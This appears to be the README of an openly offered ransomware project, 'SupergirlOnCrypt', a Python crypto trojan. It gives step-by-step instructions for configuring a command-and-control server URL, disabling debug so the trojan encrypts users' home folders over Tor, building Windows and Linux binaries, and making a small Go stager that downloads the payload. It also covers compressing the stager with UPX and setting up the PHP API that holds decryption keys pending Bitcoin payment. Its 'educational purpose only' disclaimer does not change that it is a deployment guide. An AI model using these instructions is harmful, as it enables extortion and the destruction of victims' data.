# SupergirlOnCrypt :heart: :punch: :boom:

![Project Logo](https://thoughtful-dev.com/projects/supergirloncrypt/header.jpg)

**You currently cant decrypt Files unless you set the `locked` column in the database for this PC to `0`. I will try to add something other than Bitcoin Payment. Maybe some Supergirl Questions?**

**For EDUCATIONAL PURPOSE ONLY**

This is a Crypto Trojan written in Python which can be packed using Pyinstaller... 
and i :heart: Supergirl so there you go.

## Content
1. [Requirements](#requirements)
2. [Setup](#setup)
3. [Building](#building)
---
![Image while Building](https://thoughtful-dev.com/projects/supergirloncrypt/term.png)
---
## Requirements

Both Windows AND Linux must have Python >= 3.5 installed to build the Executable/Binary.

Optionally you need the Golang compiler if you want to use the Go Stager because the Binary with Pyinstaller is quite large (~60mb - Linux , 30mb - Windows)
(Go Stager is only ~700kb).

---
## Setup

We will generate the API´s public and private key in this process.
So if you first generate a binary for Linux as shown here then you have to copy the whole repository folder to the windows box and only choose to recreate the `venv`.
## The Trojan

1. Change the API_URL in App/Config.py to your C&C Server URL
2. Disable DEBUG_MODE (Leave it on if your API is running locally because otherwise Tor cant reach your local network)
3. Optionally change your File Types
4. Build Executables/Binary for Windows and/or Linux
5. Setup API

## Overview of DEBUG True vs False
Debug On | Debug Off
------------ | -------------
Creates a logfile | No logfile
Does not user Tor | Uses Tor to communicate
Encrypts Folder `./test_files` | Encrypts Users HomeFolder

**If you are Testing leave the DEBUG MODE ON OR USE A VM**


## Building

### Linux
```
$ cd Scripts
$ ./supergirl.sh setup python3
$ ./supergirl.sh build
```
**Now copy the whole folder to the Windows VM/Machine where you want to build the Windows Executable. When running the `supergirl.ps1` ONLY recreate the `venv` and NOT the Keys since they are already generated from our Linux Setup.** *

*Optionally you can also clone the Repo to the Windows Machine and only replace `API/bin/private.key` and `App/res/server.public.key`

**This also applies vice versa**

### Windows
```
PS> cd Scripts
PS> .\supergirl.ps1 -mode setup -path C:\\...\\python.exe
PS> .\supergirl.ps1 -mode build
```

### Building Stager
1. Upload your Binary which you gathered from the previous step
2. Go to `./Stagers/Go` and open `main.go`
3. Change line 39 `var url string = "your-direct-download-url-here"`

#### Building a Linux Stager
4. `GOOS=linux go build -ldflags="-s -w" -o stager main.go`

#### Building a Windows Stager
5. `GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o stager.exe main.go`

6. Optionally compress the Stager(.exe) binary with upx

7. LINUX: `upx --ultra-brute -o compressed_stager stager`
7. WINDOWS: `upx.exe --ultra-brute -o compressed_stager.exe stager.exe`

8. Wait...
9. ???
10. Profit.


## API

Since we communicate with our API we need to set it up. The API(located in ./API duhh) is written in PHP so any Linux /Win Server will do.
On your Ubuntu C&C Server run:
```
$ sudo add-apt-repository ppa:ondrej/php
$ sudo apt update
$ sudo apt install apache2 php7.1 php7.1-mbstring php7.1-sqlite3 php7.1-xml
$ sudo apt install composer
```
Now copy the API Folder to your Server in the www root
```
$ cd <web-root>
$ composer install
```
We need to install python to decrypt our keys if a user wants to decrypt
```
$ sudo apt install python3 python3-dev python3-pip
$ cd <web-root>
$ pip install cryptography
```
Your API should now be ready on http://ip/public (should respond with 501)

**I wont show you how to setup a Tor hidden Service**



# Disclaimer

### FOR EDUCATIONAL PURPOSE ONLY I AM NOT RESPONSIBLE FOR ANYTHING
```
MIT License

Copyright (c) 2017 ThoughtfulDev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
---
I have no Idea if you understand this README. 
